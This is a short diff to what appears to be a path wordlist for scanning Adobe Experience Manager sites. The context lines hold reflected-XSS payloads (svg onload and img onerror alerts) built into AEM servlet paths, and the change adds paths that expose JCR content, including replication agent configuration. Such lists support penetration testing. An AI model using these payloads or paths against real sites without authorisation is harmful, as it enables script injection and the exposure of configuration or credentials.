@@ -17,3 +17,5 @@
 /etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
 /dam/jcr:content/xxxxxxxxxxxx%27\%22%3E%3Csvg/onload=alert(1)%3E.childrenlist.json.json/ab.html
 /libs/dam/merge/metadata.css/test.html?path=/etc<img+src=x+onerror=alert(1);>&.ico
+/jcr:content.json
+/etc/replication/agents.author/publish/jcr:content.json
